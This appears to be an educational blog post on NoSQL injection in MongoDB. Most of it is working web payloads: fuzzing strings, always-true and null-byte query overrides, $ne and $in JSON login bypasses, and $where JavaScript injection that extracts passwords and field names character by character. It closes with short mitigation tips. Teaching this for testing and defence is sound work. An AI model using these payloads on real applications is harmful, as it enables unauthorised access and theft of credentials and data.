---
title: "NoSQL Injection: Exploitation Techniques and Attack Scenarios 💣"
description: "NoSQL Injection: Exploitation Techniques and Attack Scenarios 💣"
date: 2025-07-25
tags: ["nosql", "injection", "web-security"]
readTime: "6 min read"
---

![](https://cdn-images-1.medium.com/max/800/0*v7AwZvTJBpEZ6pc-)

### Overview

NoSQL injection occurs when untrusted user input is unsafely interpolated into NoSQL queries. Due to the flexible, schema-less nature of NoSQL databases (like MongoDB, CouchDB, etc.), traditional SQLi defenses often fall short — leading to novel attack surfaces.

> ⚠️ This post is for **educational purposes only**. I follow responsible disclosure.

* * *

#### There are two major types of NoSQL Injection:

#### 1\. Syntax Injection

-   Involves breaking the query syntax and injecting custom code.
-   Similar in spirit to classic SQLi, but the syntax and context differ significantly.

#### 2\. Operator Injection

-   Leverages query operators like `$ne`, `$in`, `$regex`, or `$where` to manipulate logic and extract data.

![](https://cdn-images-1.medium.com/max/800/0*OAr1t0wpeP4cq7FR.gif)

* * *

### NoSQL Syntax Injection 🔍

#### Detecting Syntax Injection in MongoDB 🧪

**Test URL:**

```
https://website.com/product/lookup?category=shoes
```

**Underlying Query:**

```
this.category == 'shoes'
```

**Fuzzing Example:**

```
'"`{;$Foo}$Foo \xYZ
```

**Encoded attack:**

```
https://website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Response anomalies may indicate unsanitized user input.

* * *

### Character-Based Testing 🔍

Inject a single quote:

```
this.category == '''
```

If this breaks the query, try:

```
this.category == '\''
```

If it works, the app is parsing raw input in MongoDB queries — potential syntax injection.

![](https://cdn-images-1.medium.com/max/800/0*3GDyPqYCC_8ddBfD.gif)

* * *

### Boolean Conditions for Validation ✅

-   False condition:

```
https://.../lookup?category=shoes'+&&+0+&&+'x
```

-   True condition:

```
https://.../lookup?category=shoes'+&&+1+&&+'x
```

If the application behaves differently, it confirms backend query manipulation.

* * *

### Overriding Conditions 🧨

**Example Payload:**

```
https://.../lookup?category=shoes'||'1'=='1
```

**Query:**

```
this.category == 'shoes' || '1' == '1'
```

This forces the condition to always return `true`.

* * *

### Bypassing with Null Characters 🧬

**Scenario:**

```
this.category == 'shoes' && this.released == 1
```

**Payload:**

```
https://.../lookup?category=fizzy'%00
```

If the backend trims after null byte, `this.released` is ignored — potentially exposing unreleased data.

![](https://cdn-images-1.medium.com/max/800/0*wZRN2FjnTojtvqV0)

* * *

### NoSQL Operator Injection

![](https://cdn-images-1.medium.com/max/800/1*tOiNTp4R0MsI8ahpcuMc5A.png)

* * *

### Authentication Bypass Example 🔓

**Original Request:**

```
{"username":"admin","password":"invalidpassword"}
```

**Bypass with** `**$ne**`**:**

```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Returns all users where username and password ≠ “invalid” — likely logs in first valid user.

* * *

#### Target Specific User 🎯

```
{"username":{"$in":["admin"]},"password":{"$ne":""}}
```

![](https://cdn-images-1.medium.com/max/800/0*kbJs8yzqNe7Cy15o.gif)

* * *

### JavaScript Injection via `$where` 💉

**Request:**

```
https://.../user/lookup?username=admin
```

**Underlying Query:**

```
{ "$where": "this.username == 'admin'" }
```

**Payload Example:**

```
admin' && this.password[0] == 'a' || 'a'=='b
```

* * *

### 🔍 Identifying Field Names

Compare responses:

1.  Known field:

```
admin' && this.username!='
```

2\. Unknown field:

```
admin' && this.foo!='
```

Identical output for username/password implies valid field.

* * *

### Exploiting Operator Injection to Extract Data 🔐

**Injecting** `**$where**` **as Parameter**

Test:

```
{"username":"admin", "password":"admin", "$where":"1"}{"username":"admin", "password":"admin", "$where":"0"}
```

Different responses indicate `$where` is evaluated.

**Field Extraction via** `**Object.keys**`

```
"$where": "Object.keys(this)[0].match('^.{0}a.*')"
```

Extract character-by-character using RegEx.

* * *

### Conclusion

NoSQL injections can be just as dangerous as traditional SQL injections. By abusing flexible data models, JavaScript evaluation, and improper sanitization, attackers can:

-   Bypass login
-   Dump sensitive data
-   Extract hidden or unreleased records
-   Perform privilege escalation

![](https://cdn-images-1.medium.com/max/800/0*ICawR5TViATVkHgy.gif)

### 🔐 Mitigation Tips:

-   Always sanitize and validate input.
-   Disable JavaScript-based operators like `$where` when not needed.
-   Use allowlists for query fields.
-   Implement robust logging and monitoring.

* * *

📌 **Special thanks to** [**Shah kaif**](https://medium.com/u/10f677056bcd?source=post_page---user_mention--d82e6591a63a---------------------------------------) **—** My dedicated learning partner — for collaborating on this research and finding.

![](https://cdn-images-1.medium.com/max/800/0*Rwuan_0X6RFQOD0J.gif)